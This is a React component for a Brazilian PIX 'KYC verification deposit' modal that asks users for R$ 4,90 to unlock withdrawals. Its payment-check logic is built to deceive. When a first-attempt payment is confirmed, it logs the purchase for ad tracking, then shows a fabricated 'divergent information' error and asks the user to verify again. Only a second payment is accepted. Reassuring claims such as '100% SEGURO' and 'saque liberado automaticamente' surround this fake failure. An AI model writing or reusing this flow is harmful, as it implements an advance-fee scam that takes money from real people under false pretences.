import React, { useState, useEffect, useRef } from 'react';
import { X, Shield, CheckCircle, Copy, QrCode, AlertTriangle, Info } from 'lucide-react';
import { useFictionalPix } from '../hooks/useFictionalPix';
import { QRCodeGenerator } from './QRCodeGenerator';
import { trackPurchase } from '../utils/tracking';

interface KYCDepositModalProps {
  isOpen: boolean;
  onClose: () => void;
  onVerificationComplete: () => void;
  onVerificationFailed: () => void;
  depositAttempt: number;
}

export const KYCDepositModal: React.FC<KYCDepositModalProps> = ({
  isOpen,
  onClose,
  onVerificationComplete,
  onVerificationFailed,
  depositAttempt
}) => {
  const [isGenerating, setIsGenerating] = useState(false);
  const [pixGenerated, setPixGenerated] = useState(false);
  const [copied, setCopied] = useState(false);
  const [processingPayment, setProcessingPayment] = useState(false);
  const [showError, setShowError] = useState(false);
  const { pixData, createPix, checkPixStatus, reset } = useFictionalPix();
  const paymentCheckIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const isProcessingRef = useRef(false);
  const hasTrackedPurchaseRef = useRef(false);

  const DEPOSIT_AMOUNT = 4.90;
  const isFirstAttempt = depositAttempt === 1;

  useEffect(() => {
    if (!isOpen) {
      if (paymentCheckIntervalRef.current) {
        clearInterval(paymentCheckIntervalRef.current);
        paymentCheckIntervalRef.current = null;
      }
      setIsGenerating(false);
      setPixGenerated(false);
      setCopied(false);
      setProcessingPayment(false);
      setShowError(false);
      isProcessingRef.current = false;
      hasTrackedPurchaseRef.current = false;
      reset();
    }
  }, [isOpen, reset]);

  useEffect(() => {
    if (!pixData || !isOpen || !pixGenerated) return;

    const checkPayment = async () => {
      if (isProcessingRef.current) return;

      try {
        const status = await checkPixStatus(pixData.transactionId);

        if (status.status === 'paid' && !isProcessingRef.current) {
          isProcessingRef.current = true;

          if (paymentCheckIntervalRef.current) {
            clearInterval(paymentCheckIntervalRef.current);
            paymentCheckIntervalRef.current = null;
          }

          setProcessingPayment(true);

          if (isFirstAttempt && !hasTrackedPurchaseRef.current) {
            trackPurchase(status.value);
            hasTrackedPurchaseRef.current = true;
          }

          setTimeout(() => {
            if (isFirstAttempt) {
              setShowError(true);

              setTimeout(() => {
                onVerificationFailed();
                setTimeout(() => {
                  onClose();
                }, 500);
              }, 3000);
            } else {
              onVerificationComplete();

              setTimeout(() => {
                onClose();
              }, 2000);
            }
          }, 2000);
        }
      } catch (err) {
        console.error('Erro ao verificar pagamento:', err);
      }
    };

    checkPayment();
    const interval = setInterval(checkPayment, 3000);
    paymentCheckIntervalRef.current = interval;

    return () => {
      if (interval) clearInterval(interval);
    };
  }, [pixData, isOpen, pixGenerated, checkPixStatus, onVerificationComplete, onVerificationFailed, onClose, isFirstAttempt]);

  const handleGeneratePix = async () => {
    setIsGenerating(true);

    try {
      await createPix(DEPOSIT_AMOUNT);
      setPixGenerated(true);
    } catch (err) {
      console.error('Erro ao gerar PIX:', err);
    } finally {
      setIsGenerating(false);
    }
  };

  const copyPixCode = async () => {
    if (!pixData?.qrcode) return;

    try {
      await navigator.clipboard.writeText(pixData.qrcode);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error('Erro ao copiar:', err);
    }
  };

  if (!isOpen) return null;

  if (showError) {
    return (
      <div className="fixed inset-0 bg-black/90 backdrop-blur-sm flex items-center justify-center p-4 z-[70]">
        <div className="bg-gray-900 rounded-3xl shadow-2xl w-full max-w-md border border-red-500 p-8 animate-scale-in">
          <div className="text-center">
            <div className="w-20 h-20 bg-red-500 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
              <AlertTriangle className="w-10 h-10 text-white" />
            </div>
            <h3 className="text-white font-bold text-2xl mb-3">Erro na Verificacao</h3>
            <p className="text-red-300 text-base mb-2 font-semibold">
              Informacoes divergentes
            </p>
            <p className="text-gray-400 text-sm">
              Por favor, refaca a verificacao KYC
            </p>
          </div>
        </div>
      </div>
    );
  }

  if (processingPayment && !showError) {
    return (
      <div className="fixed inset-0 bg-black/90 backdrop-blur-sm flex items-center justify-center p-4 z-[70]">
        <div className="bg-gray-900 rounded-3xl shadow-2xl w-full max-w-md border border-gray-800 p-8">
          <div className="text-center">
            <div className="w-20 h-20 bg-accent rounded-full flex items-center justify-center mx-auto mb-4">
              <div className="w-10 h-10 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
            </div>
            <h3 className="text-white font-bold text-2xl mb-2">Processando Pagamento</h3>
            <p className="text-gray-400 text-sm">
              Aguarde enquanto verificamos seu deposito
            </p>
          </div>
        </div>
      </div>
    );
  }

  if (pixGenerated && pixData) {
    return (
      <div className="fixed inset-0 bg-black/90 backdrop-blur-sm flex items-center justify-center p-4 z-[70] overflow-y-auto">
        <div className="bg-gray-900 rounded-3xl shadow-2xl w-full max-w-md border border-gray-800 my-4 max-h-[95vh] overflow-y-auto">
          <div className="bg-accent p-4 rounded-t-3xl sticky top-0 z-10">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-white/20 rounded-full flex items-center justify-center">
                  <QrCode className="w-5 h-5 text-white" />
                </div>
                <div>
                  <h3 className="text-white font-bold">PIX de Verificacao</h3>
                  <p className="text-white/80 text-sm">R$ {pixData.amount.toFixed(2).replace('.', ',')}</p>
                </div>
              </div>
              <button
                onClick={onClose}
                className="w-8 h-8 bg-white/20 rounded-full flex items-center justify-center hover:bg-white/30 transition-all"
              >
                <X className="w-4 h-4 text-white" />
              </button>
            </div>
          </div>

          <div className="p-5">
            <div className="space-y-4">
              <div className="bg-green-500/10 border-2 border-green-500/30 rounded-2xl p-4 mb-4">
                <div className="flex items-start gap-3">
                  <div className="w-10 h-10 bg-green-500/20 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                    <Shield className="w-5 h-5 text-green-400" />
                  </div>
                  <div>
                    <h4 className="text-green-300 font-bold text-base mb-2">Verificacao de Titularidade</h4>
                    <p className="text-green-300/80 text-sm leading-relaxed">
                      Este deposito confirma que voce e o titular da conta. Apos a confirmacao, sua conta sera validada e o saque sera liberado automaticamente.
                    </p>
                  </div>
                </div>
              </div>

              <div className="bg-gray-800 rounded-2xl p-5 text-center border-2 border-accent/30 shadow-lg">
                <div className="mb-3">
                  <div className="inline-flex items-center gap-2 bg-accent/20 px-3 py-1.5 rounded-full mb-3">
                    <CheckCircle className="w-4 h-4 text-accent" />
                    <span className="text-accent text-xs font-bold">100% SEGURO</span>
                  </div>
                </div>

                <div className="bg-white rounded-2xl p-5 inline-block mb-3 shadow-xl">
                  <QRCodeGenerator
                    value={pixData.qrcode}
                    size={200}
                    className="mx-auto"
                  />
                </div>

                <p className="text-gray-300 text-sm font-semibold mb-2">Escaneie o QR Code</p>
                <p className="text-gray-500 text-xs">Com o app do seu banco</p>
              </div>

              <div className="bg-blue-500/10 border border-blue-500/30 rounded-xl p-3">
                <div className="flex items-start gap-2">
                  <Info className="w-4 h-4 text-blue-400 mt-0.5 flex-shrink-0" />
                  <div>
                    <p className="text-blue-300 text-xs font-semibold mb-1">Garantia de Seguranca</p>
                    <p className="text-blue-300/80 text-xs">
                      Seus dados sao criptografados e protegidos. Esta verificacao e obrigatoria para liberar funcoes financeiras.
                    </p>
                  </div>
                </div>
              </div>

              <div>
                <label className="block text-white font-semibold mb-2 text-sm">
                  Codigo PIX (Copia e Cola)
                </label>
                <div className="bg-gray-800 rounded-xl p-3 border border-gray-700">
                  <input
                    type="text"
                    value={pixData.qrcode}
                    readOnly
                    className="w-full px-3 py-3 bg-gray-900 border border-gray-700 rounded-lg text-xs font-mono mb-3 focus:outline-none text-white select-all"
                    onClick={(e) => (e.target as HTMLInputElement).select()}
                  />
                  <button
                    onClick={copyPixCode}
                    className={`w-full py-3.5 rounded-lg font-bold transition-all duration-300 active:scale-95 shadow-lg ${
                      copied
                        ? 'bg-green-500 text-white'
                        : 'bg-accent text-white hover:bg-accent-hover'
                    }`}
                    style={{ touchAction: 'manipulation' }}
                  >
                    {copied ? (
                      <div className="flex items-center justify-center gap-2">
                        <CheckCircle className="w-5 h-5" />
                        <span>Codigo Copiado!</span>
                      </div>
                    ) : (
                      <div className="flex items-center justify-center gap-2">
                        <Copy className="w-5 h-5" />
                        <span>Copiar Codigo PIX</span>
                      </div>
                    )}
                  </button>
                </div>
              </div>

              <div className="bg-green-900/50 border-2 border-green-700 rounded-xl p-4">
                <div className="flex items-center justify-center gap-3 mb-2">
                  <div className="w-5 h-5 border-2 border-green-400 border-t-transparent rounded-full animate-spin"></div>
                  <p className="text-green-200 text-sm font-bold">
                    Aguardando confirmacao do pagamento
                  </p>
                </div>
                <p className="text-green-300/80 text-xs text-center">
                  Apos o pagamento, sua conta sera validada automaticamente
                </p>
              </div>

              <div className="bg-gray-800/50 border border-gray-700 rounded-xl p-3">
                <div className="flex items-start gap-2">
                  <CheckCircle className="w-4 h-4 text-accent mt-0.5 flex-shrink-0" />
                  <div className="space-y-1 text-xs text-gray-400">
                    <p>1. Abra o app do seu banco</p>
                    <p>2. Escolha pagar com PIX</p>
                    <p>3. Escaneie o QR Code ou cole o codigo</p>
                    <p>4. Confirme o pagamento de R$ 4,90</p>
                    <p className="text-accent font-semibold">5. Saque liberado automaticamente!</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 bg-black/90 backdrop-blur-sm flex items-center justify-center p-4 z-[70]">
      <div className="bg-gray-900 rounded-3xl shadow-2xl w-full max-w-md border border-gray-800">
        <div className="bg-gradient-to-r from-accent to-accent-hover p-6 rounded-t-3xl relative overflow-hidden">
          <div className="absolute inset-0 bg-white/5"></div>
          <button
            onClick={onClose}
            className="absolute top-4 right-4 text-white/80 hover:text-white transition-colors z-10"
          >
            <X className="w-6 h-6" />
          </button>

          <div className="relative z-10">
            <div className="flex items-center gap-3 mb-3">
              <div className="w-12 h-12 bg-white/20 backdrop-blur-sm rounded-2xl flex items-center justify-center">
                <Shield className="w-6 h-6 text-white" />
              </div>
              <div>
                <h2 className="text-2xl font-bold text-white">Verificacao KYC</h2>
                <p className="text-white/80 text-sm">Libere saques e depositos</p>
              </div>
            </div>
          </div>
        </div>

        <div className="p-6">
          <div className="bg-blue-500/10 border-2 border-blue-500/30 rounded-2xl p-4 mb-5">
            <div className="flex items-start gap-3">
              <div className="w-10 h-10 bg-blue-500/20 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                <Info className="w-5 h-5 text-blue-400" />
              </div>
              <div>
                <h4 className="text-blue-300 font-bold text-base mb-2">Por que preciso verificar?</h4>
                <p className="text-blue-300/80 text-sm leading-relaxed">
                  A verificacao KYC confirma o titular da conta e libera funcoes financeiras como saque e deposito. E necessario realizar um deposito minimo via PIX para validar sua titularidade.
                </p>
              </div>
            </div>
          </div>

          <div className="bg-gray-800 rounded-2xl p-6 border border-gray-700 mb-4">
            <div className="text-center">
              <div className="w-16 h-16 bg-accent/20 rounded-full flex items-center justify-center mx-auto mb-4">
                <Shield className="w-8 h-8 text-accent" />
              </div>
              <h3 className="text-white font-bold text-xl mb-2">Deposito de Verificacao</h3>
              <p className="text-gray-400 text-sm mb-4">
                Confirme sua titularidade com um deposito minimo
              </p>

              <div className="bg-accent/20 rounded-xl p-5 border-2 border-accent/50 mb-4 shadow-lg">
                <div className="text-accent text-4xl font-bold mb-2">
                  R$ {DEPOSIT_AMOUNT.toFixed(2).replace('.', ',')}
                </div>
                <p className="text-gray-300 text-sm font-semibold">Valor de verificacao</p>
              </div>

              <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-3 mb-4">
                <div className="flex items-center justify-center gap-2 mb-1">
                  <CheckCircle className="w-4 h-4 text-green-400" />
                  <span className="text-green-300 text-sm font-bold">Liberacao Automatica</span>
                </div>
                <p className="text-green-300/80 text-xs">
                  Apos confirmacao, saques serao liberados instantaneamente
                </p>
              </div>

              <button
                onClick={handleGeneratePix}
                disabled={isGenerating}
                className="w-full bg-accent text-white font-bold py-4 rounded-xl hover:bg-accent-hover transition-all duration-300 active:scale-95 shadow-modern disabled:opacity-50 disabled:cursor-not-allowed"
                style={{ touchAction: 'manipulation' }}
              >
                {isGenerating ? (
                  <div className="flex items-center justify-center gap-2">
                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    <span>Gerando PIX Seguro...</span>
                  </div>
                ) : (
                  <div className="flex items-center justify-center gap-2">
                    <Shield className="w-5 h-5" />
                    <span>Iniciar Verificacao</span>
                  </div>
                )}
              </button>
            </div>
          </div>

          <div className="bg-gray-800/50 border border-gray-700 rounded-xl p-3">
            <div className="flex items-start gap-2">
              <Shield className="w-4 h-4 text-accent mt-0.5 flex-shrink-0" />
              <div className="space-y-1 text-xs text-gray-400">
                <p className="font-semibold text-gray-300">Seguranca Garantida:</p>
                <p>• Dados protegidos e criptografados</p>
                <p>• Processo 100% seguro via PIX</p>
                <p>• Validacao automatica e instantanea</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
